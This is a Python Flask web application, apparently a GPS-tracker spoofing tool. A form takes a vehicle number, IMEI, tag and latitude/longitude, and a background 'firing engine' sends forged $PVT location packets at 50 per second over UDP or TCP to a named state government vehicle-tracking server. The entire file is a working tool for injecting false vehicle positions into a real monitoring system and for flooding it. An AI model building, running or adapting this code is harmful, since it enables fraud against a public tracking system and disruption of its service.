import os, socket, threading, time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- ENGINE STATE ---
status = {
    "firing": False, "count": 0, "proto": "UDP",
    "tag": "", "imei": "", "vno": "", "lat": "", "lon": ""
}

HTML_V82_ULTIMATE = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - ULTIMATE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 450px; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 300px; width: 100%; max-width: 450px; border: 2px solid #0f0; border-radius: 15px; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input, select { width: 90%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .gps { background: #004466; color: #fff; border: 1px solid #00ffff; }
        .reset { background: #333; color: #fff; }
        .preview { background: #111; color: yellow; padding: 10px; font-size: 10px; word-break: break-all; margin-top: 10px; border: 1px dashed #0f0; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="margin:0;">🚀 V82 ULTIMATE</h2>
        <div class="metric" id="cnt">0</div>
        <form action="/action" method="post" class="grid">
            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{vno}}" oninput="updateUI()"></div>
            <div><label>IMEI</label><input type="text" name="imei" id="imei" value="{{imei}}" oninput="updateUI()"></div>
            <div><label>TAG</label><input type="text" name="tag" id="tag" value="{{tag}}" oninput="updateUI()"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{lat}}" oninput="updateUI()"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{lon}}" oninput="updateUI()"></div>
            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET CURRENT LOCATION</button>
            <div class="full">
                <label>PROTOCOL (50 PKT/S)</label>
                <select name="proto" id="proto" onchange="updateUI()">
                    <option value="UDP" {% if proto == 'UDP' %}selected{% endif %}>UDP</option>
                    <option value="TCP" {% if proto == 'TCP' %}selected{% endif %}>TCP</option>
                </select>
            </div>
            <div class="full preview" id="preview">Packet Preview...</div>
            <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
            <button class="btn reset full" name="btn" value="reset">🔄 RESET ALL</button>
        </form>
    </div>
    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([25.65, 84.78], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([25.65, 84.78]).addTo(map);

        function updateUI() {
            let v = document.getElementById('vno').value.toUpperCase();
            let i = document.getElementById('imei').value;
            let t = document.getElementById('tag').value.toUpperCase();
            let la = document.getElementById('lat').value || "0";
            let lo = document.getElementById('lon').value || "0";
            let p = document.getElementById('proto').value;
            let d = new Date().toLocaleDateString('en-GB').replace(/\//g, '');
            let h = new Date().toLocaleTimeString('en-GB', {hour12: false}).replace(/:/g, '');
            
            document.getElementById('preview').innerText = `[${p}] $PVT,${t},${i},${v},1,${d},${h},${la},N,${lo},E...*`;
            if(la != "0") {
                let pos = [parseFloat(la), parseFloat(lo)];
                map.setView(pos, 15);
                marker.setLatLng(pos);
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    document.getElementById('lat').value = pos.coords.latitude.toFixed(6);
                    document.getElementById('lon').value = pos.coords.longitude.toFixed(6);
                    updateUI();
                });
            }
        }

        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count.toLocaleString();
            });
        }, 1000);
        updateUI();
    </script>
</body>
</html>
"""

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            now = datetime.now()
            pkt = f"$PVT,{status['tag']},{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
            
            # One-by-One Firing (50 packets per second)
            if status["proto"] == "UDP":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for _ in range(50):
                    if not status["firing"]: break
                    sock.sendto(pkt, target)
                    status["count"] += 1
                    time.sleep(0.02) # 20ms gap = 50 pkt/s
                sock.close()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                try:
                    sock.connect(target)
                    for _ in range(50):
                        if not status["firing"]: break
                        sock.send(pkt)
                        status["count"] += 1
                        time.sleep(0.02)
                finally: sock.close()
        except: time.sleep(1)

@app.route('/')
def home(): return render_template_string(HTML_V82_ULTIMATE, **status)

@app.route('/data')
def data(): return jsonify(status)

@app.route('/action', methods=['POST'])
def action():
    val = request.form.get('btn')
    if val == "reset":
        status.update({"firing": False, "count": 0, "tag": "", "imei": "", "vno": "", "lat": "", "lon": ""})
    else:
        status.update({
            "tag": request.form.get('tag', '').upper(),
            "imei": request.form.get('imei', ''),
            "vno": request.form.get('vno', '').upper(),
            "lat": request.form.get('lat', ''),
            "lon": request.form.get('lon', ''),
            "proto": request.form.get('proto', 'UDP')
        })
        if val == "start" and not status["firing"]:
            status["firing"] = True
            threading.Thread(target=firing_engine, daemon=True).start()
        elif val == "stop": status["firing"] = False
    return home()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
